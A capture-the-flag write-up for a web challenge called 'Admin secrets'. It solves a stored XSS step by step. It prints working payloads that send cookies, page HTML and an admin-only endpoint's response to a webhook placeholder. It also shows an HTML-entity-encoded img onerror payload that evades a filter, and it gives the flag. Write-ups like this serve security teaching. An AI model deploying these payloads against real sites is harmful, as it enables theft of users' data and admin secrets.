# Admin secrets

Category: Web

This challenge is a simple XSS challenge, but with many hoops to jump through. [webhook.site](webhook.site) is really useful for these challenges.  

A simple 

```html
<script>fetch("<webhook url>?"+document.cookie)</script>
```

doesn't work because no cookies are used. Inspecting the HTML of the page reveals an admin section: 

```html
<div class="col-8 admin_console">
  <!-- Only the admin can see this -->
</div>
```

Unfortunately, the admin section is after the injected content, so attempting to access it immediately would cause a null pointer exception as it does not exist yet. A timeout is used to mitigate this:

```html
<script>
setTimeout(()=>{
  fetch("<webhook url>?"+encodeURIComponent(document.querySelector(".admin_console").innerHTML))
},100)
</script>
```

The HTML of the admin console is revealed:

```html
<button class="btn btn-primary flag-button">Access Flag</button>
```

Hmm, still no flag. To investigate further, we can retrieve the HTML of the whole admin page:

```html
<script>
setTimeout(()=>{
  fetch("<webhook url>?"+encodeURIComponent(document.querySelector("body").innerHTML))
},100)
</script>
```

The exposed HTML is more interesting:

```html
<script>
    var_flag='';
    f=function(e){ 
        $.ajax({ 
            type:"GET",
            url:"/admin_flag", 
            success:function(resp){
            	flag=resp;
            	$("#responseAlert").text(resp);
            	$("#responseAlert").css("display","");
           	}
        })
        return flag;
    };
    $('.flag-button').on('click',f);
</script>
```

It appears the flag can be accessed using the `/admin_flag` endpoint :thinking:.

Unfortunately, no response is received from the admin. Perhaps some filtering is in place. Base64 encoding the response should help.

```html
<script>
fetch("/admin_flag").then(a=>a.text()).then(flag=>
  fetch("<webhook url>?"+encodeURIComponent(btoa(flag)))
)
</script>
```

Base64 decoded response:

`This post contains unsafe content. To prevent unauthorized access, the flag cannot be accessed for the following violations: Script tags found. Double quote found. Parenthesis found. `

No big deal, I'll just use img tags and [HTML encode](http://evuln.com/tools/xss-encoder/) the payload instead:

```html
<img src=bleh onerror=&#x66;&#x65;&#x74;&#x63;&#x68;&#x28;&#x22;&#x2F;&#x61;&#x64;&#x6D;&#x69;&#x6E;&#x5F;&#x66;&#x6C;&#x61;&#x67;&#x22;&#x29;&#x2E;&#x74;&#x68;&#x65;&#x6E;&#x28;&#x61;&#x3D;&#x3E;&#x61;&#x2E;&#x74;&#x65;&#x78;&#x74;&#x28;&#x29;&#x29;&#x2E;&#x74;&#x68;&#x65;&#x6E;&#x28;&#x66;&#x6C;&#x61;&#x67;&#x3D;&#x3E;&#x0A;&#x20;&#x20;&#x66;&#x65;&#x74;&#x63;&#x68;&#x28;&#x22;&#x3C;&#x77;&#x65;&#x62;&#x68;&#x6F;&#x6F;&#x6B;&#x20;&#x75;&#x72;&#x6C;&#x3E;&#x3F;&#x22;&#x2B;&#x65;&#x6E;&#x63;&#x6F;&#x64;&#x65;&#x55;&#x52;&#x49;&#x43;&#x6F;&#x6D;&#x70;&#x6F;&#x6E;&#x65;&#x6E;&#x74;&#x28;&#x62;&#x74;&#x6F;&#x61;&#x28;&#x66;&#x6C;&#x61;&#x67;&#x29;&#x29;&#x29;&#x0A;&#x29;>
```

Base64 decoded flag: `tjctf{st0p_st3aling_th3_ADm1ns_fl4gs}`

